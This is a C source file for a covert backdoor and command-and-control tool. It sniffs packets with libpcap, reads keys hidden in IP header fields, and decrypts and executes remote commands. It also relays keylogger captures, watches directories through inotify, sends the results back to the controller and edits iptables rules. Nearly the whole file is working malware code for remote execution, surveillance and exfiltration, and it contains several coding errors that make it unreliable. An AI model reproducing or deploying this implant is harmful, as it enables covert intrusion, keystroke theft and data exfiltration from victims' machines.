#include "libpcap.h"

int Packetcapture(char *filter, struct filter Filter){
    char errorbuffer[PCAP_ERRBUF_SIZE];
    struct bpf_program fp; //holds fp program info
    pcap_if_t *interface_list;
    bpf_u_int32 netp; //holds the ip

    //find the first network device capable of packet capture
    if(pcap_findalldevs(&interface_list,errorbuffer) == -1){
        printf("pcap_findalldevs: %s\n", errorbuffer);
        exit(0);
    }

    //open the network device
    //BUFSIZ is defined in pcap.h
    if((interfaceinfo = pcap_open_live(interface_list->name, BUFSIZ, 1, -1, errorbuffer)) == NULL){
        printf("pcap_open_live(): %s\n", errorbuffer);
        exit(0);
    }
    if(pcap_compile(interfaceinfo, &fp, filter, 0, netp) == -1){
        perror("pcap_comile");
    }

    if(pcap_setfilter(interfaceinfo, &fp) == -1){
        perror("pcap_setfilter");
    }

    //main loop for receiving
    pcap_loop(interfaceinfo, -1, ReadPacket, (u_char*)&Filter);
    return 0;
}

void ReadPacket(u_char* args, const struct pcap_pkthdr* pkthdr, const u_char* packet){
    //grab the type of packet
    struct ether_header *ethernet;
    ethernet = (struct ether_header *)packet;
    u_int16_t type = ntohs(ethernet->ether_type);
    struct filter* Filter = NULL;
    Filter = (struct filter *)args;
    if(type == ETHERTYPE_IP){
        ParseIP(Filter, pkthdr, packet);
    }
}

void ParseIP(struct filter *Filter, const struct pcap_pkthdr* pkthdr, const u_char* packet){
    const struct my_ip* ip;
    u_int length = pkthdr->len;
    u_int hlen,off,version;
    int len;
    FILE *fp;

    //skip past the ethernet header
    ip = (struct my_ip*)(packet + sizeof(struct ether_header));
    length-= sizeof(struct ether_header);

    if(length < sizeof(struct my_ip)){
        printf("Packet length is incorrect %d", length);
        exit(1);
    }

    len = ntohs(ip->ip_len);
    hlen = IP_HL(ip);
    version = IP_V(ip);
    off = ntohs(ip->ip_off);

    if(version != 4){
        perror("Unknown error");
        exit(1);
    } else if(hlen < 5){
        perror("Bad header length");
        exit(1);
    } else if((int)length < len){
        perror("Truncated IP");
        exit(1);
    }

    if((fp = fopen(RESULT_FILE, "ab+")) < 0){
        perror("fopen");
        exit(1);
    }

    //CNC receiving results
    if(Filter->infected == false) {
        //check the key
        printf("tos: %c\n", ip->ip_tos);
        printf("ipid: %c\n", ip->ip_id);
        printf("ttl: %c\n", ip->ip_ttl);
        if(CheckKey(ip->ip_tos, ip->ip_id) > 0) {
            //check if EOT packet
            if(ip->ip_ttl == 4) {
                fclose(fp);
                pcap_breakloop(interfaceinfo);
                //exits the program
            }

            //write to file
            char ch[1];
            ch[0] = (char)ip->ip_ttl;

            if(fwrite(ch, sizeof(char), sizeof(char), fp) <= 0){
                perror("fwrite");
                exit(1);
            }
        }
    //infected machine receiving a command
    } else if(Filter->infected == true) {
        struct in_addr src;

        switch(CheckKey(ip->ip_tos, ip->ip_id)) {
            case COMMAND:
                Filter->flag = COMMAND;
                if(Filter->tcp == false) {
                    printf("Received UDP Command\n");
                    WriteUDPFile(ip->ip_ttl);
                } else {
                    printf("Received TCP Command\n");
                    WriteTCPFile(packet);
                }

                break;
            case KEYLOGGER:
                printf("Received Keylogger packet\n");
                Filter->flag = KEYLOGGER;
                src = ip->ip_src;
                printf("source: %d", ntohs(src.s_addr));
                if(src.s_addr == inet_addr(Filter->targetip)){
                    printf("KEYLOGGER\n");
                    //copy keylogger file to results file
                    system("cat .keylogger.txt > .results");
                }
                break;
            case INOTIFY:
                printf("Received Inotify packet\n");
                Filter->flag = INOTIFY;
                printf("INOTIFY\n");

                //write to inotify file
                if(Filter->tcp == false) {
                    WriteUDPFile(ip->ip_ttl);
                } else {
                    WriteTCPFile(packet);
                }

                break;
            case EOT:   //wait for EOT packet before sending results back to the cnc
                printf("Received EOT packet\n");
                switch(Filter->flag) {
                    case COMMAND:
                        printf("EOT Command packet\n");

                        Filter->flag = COMMAND;
                        src = ip->ip_src;
                        printf("source: %d", ntohs(src.s_addr));
                        if(src.s_addr == inet_addr(Filter->targetip)){
                            sleep(1);
                            system(CHMOD);
                            system(CMD);
                            printf("COMMAND RECEIEVED \n");
                            send_results(Filter->localip, Filter->targetip, UPORT, UPORT, RESULT_FILE, Filter->tcp, Filter->flag);
                        }
                        break;
                    case KEYLOGGER:
                        printf("EOT Keylogger packet\n");
                        Filter->flag = COMMAND;
                        src = ip->ip_src;
                        printf("source: %d", ntohs(src.s_addr));
                        if(src.s_addr == inet_addr(Filter->targetip)){
                            sleep(1);
                            send_results(Filter->localip, Filter->targetip, UPORT, UPORT, RESULT_FILE, Filter->tcp, KEYLOGGER);
                        }
                        break;
                    case INOTIFY:
                        printf("EOT Inotify packet\n");

                        Filter->flag = COMMAND;
                        src = ip->ip_src;
                        printf("source: %d", ntohs(src.s_addr));
                        if(src.s_addr == inet_addr(Filter->targetip)){

                            if((fp = fopen(FILENAME, "rb+")) < 0){
                                perror("fopen");
                                exit(1);
                            }

                            char *directory = NULL;
                            char *file = NULL;
                            size_t size;

                            getline(&directory, &size, fp);
                            getline(&file, &size, fp);
                            directory[strlen(directory)-1] = '\0';

                            printf("directory: %s\n", directory);
                            printf("file: %s\n", file);

                            //start inotify
                            watch_directory(Filter->targetip, Filter->localip, directory, file, Filter->tcp);
                        }
                        break;
                }

                break;
            default:
                printf("DEBUG: Packet tossed wrong key\n");
                break;
        }
    }

    fclose(fp);
}

void WriteUDPFile(int ttl) {
    FILE *fp;
    if((fp = fopen(FILENAME, "ab+")) < 0){
        perror("fopen");
        exit(1);
    }

    if(ttl == 4) {
        fclose(fp);
        pcap_breakloop(interfaceinfo);
    }

    char ch[1];
    memset(ch,0, strlen(ch));
    ch[0] = (char)ttl;
    fprintf(fp,"%c", ch[0]);
    fflush(fp);
    fclose(fp);
}

void WriteTCPFile(const u_char* packet) {
    FILE *fp;

    if((fp = fopen(FILENAME, "wb+")) < 0){
        perror("fopen");
        exit(1);
    }

    //because safety
    unsigned char buf[BUFSIZE + 16];
    strncpy(buf, ParseTCPPayload(packet), sizeof(buf));
    printf("Payload: %s", buf);

    if((fwrite(buf, strlen((const char*)buf), sizeof(char), fp)) <= 0){
        perror("fwrite");
        exit(1);
    }
    fclose(fp);
}

const unsigned char *ParseTCPPayload(const u_char* packet) {
    const struct sniff_tcp *tcp=0;
    const struct my_ip *ip;
    unsigned char *payload;
    int size_ip;
    int size_tcp;

    unsigned char *decryptedtext = malloc(BUFSIZE + 16);

    ip = (struct my_ip*)(packet + 14);
    size_ip = IP_HL(ip)*4;

    tcp = (struct sniff_tcp*)(packet + 14 + size_ip);
    size_tcp = TH_OFF(tcp)*4;

    if(size_tcp < 20){
        perror("TCP: Control packet length is incorrect");
        exit(1);
    }
    payload = (u_char *)(packet + 14 + size_ip + size_tcp);
    decryptMessage((unsigned char*)payload, BUFSIZE+16, (unsigned char*)KEY, (unsigned char *)IV, decryptedtext);

    return decryptedtext;
}

int CheckKey(u_char ip_tos, u_short ip_id){
    // check if key is right for normal packets
    if(ip_tos == COMMAND_KEY && ip_id == COMMAND_KEY){
        return COMMAND;
    } else if(ip_tos == KEYLOGGER_KEY  && ip_id == KEYLOGGER_KEY) {
        return KEYLOGGER;
    } else if(ip_tos == INOTIFY_KEY && ip_id == INOTIFY_KEY) {
        return INOTIFY;
    } else if(ip_tos == EOT_KEY && ip_id == EOT_KEY) {
        return EOT;
    } else {
        return -1;
    }
}

void ParseTCP(struct filter *Filter, const struct pcap_pkthdr* pkthdr, const u_char* packet){
    const struct sniff_tcp *tcp=0;
    const struct my_ip *ip;
    const char *payload;
    int size_ip;
    int size_tcp;
    int size_payload;

    ip = (struct my_ip*)(packet + 14);
    size_ip = IP_HL(ip)*4;

    tcp = (struct sniff_tcp*)(packet + 14 + size_ip);
    size_tcp = TH_OFF(tcp)*4;

    if(size_tcp < 20){
        perror("TCP: Control packet length is incorrect");
        exit(1);
    }
    payload = (u_char *)(packet + 14 + size_ip + size_tcp);

    size_payload = ntohs(ip->ip_len) - (size_ip + size_tcp);

    if(size_payload > 0){
        ParsePayload(Filter, payload, size_payload, true);
    }
}

void iptables(char *ip, bool tcp, char *port, bool input, bool remove){
    char iptable[BUFSIZ];
    memset(iptable, '\0', BUFSIZ);
    if(remove){
        strcat(iptable,"/usr/sbin/iptables -D");
    } else {
        strcat(iptable,"/usr/sbin/iptables -I");
    }
    if(input){
        if(tcp){
            strcat(iptable," INPUT -p tcp ");
        } else {
            strcat(iptable," INPUT -p udp ");
        }
    } else {
        if(tcp){
            strcat(iptable," OUTPUT -p tcp ");
        } else {
            strcat(iptable," OUTPUT -p udp ");
        }
    }
    strcat(iptable, "-s ");
    strcat(iptable, ip);
    strcat(iptable, " --dport ");
    strcat(iptable,port);
    strcat(iptable, " -j ACCEPT");
    printf("Iptables: %s\n", iptable);
    system(iptable);
}

void ParsePayload(struct filter *Filter, const u_char *payload, int len, bool tcp){
    FILE *fp;
    unsigned char decryptedtext[BUFSIZE+16];
    int decryptedlen, cipherlen;

    if((fp = fopen(FILENAME, "wb+")) < 0){
        perror("fopen");
        exit(1);
    }
    cipherlen = strlen((char*)payload);
    decryptedlen = decryptMessage((unsigned char*)payload, BUFSIZE+16, (unsigned char*)KEY, (unsigned char *)IV, decryptedtext);

    if((fwrite(decryptedtext, strlen((const char*)decryptedtext), sizeof(char), fp)) <= 0){
        perror("fwrite");
        exit(1);
    }
    if(tcp){
        fclose(fp);
        system(CHMOD);
        system(CMD);
        //iptables(Filter->targetip, true, PORT, false, false);
        printf("COMMAND RECEIEVED \n");
        //sending the results back to the CNC
        //PortKnocking(Filter, NULL, NULL, true, true);
        //printf("SENDING RESULTS\n");
        send_results(Filter->localip, Filter->targetip, UPORT, UPORT, RESULT_FILE, true, Filter->flag);
        //iptables(Filter->targetip, true, PORT, false, true);
        printf("\n");
        printf("\n");
        printf("Waiting for new command\n");
    } else {
        printf("parsing udp packet\n");
    }
}

struct filter InitFilter(char *target, char *local, bool infected, bool tcp){
    struct filter Filter;

    Filter.infected = infected;
    strncpy(Filter.targetip, target, BUFSIZ);
    strncpy(Filter.localip, local, BUFSIZ);
    Filter.tcp = tcp;

    return Filter;
}

void CreateFilter(char *buffer, bool tcp){
    memset(buffer, '\0', BUFSIZ);

    if(tcp){
        strcat(buffer,"tcp and ");
    } else {
        strcat(buffer,"udp and ");
    }

    strcat(buffer, "port ");
    strncat(buffer, PORT, sizeof(PORT));
}

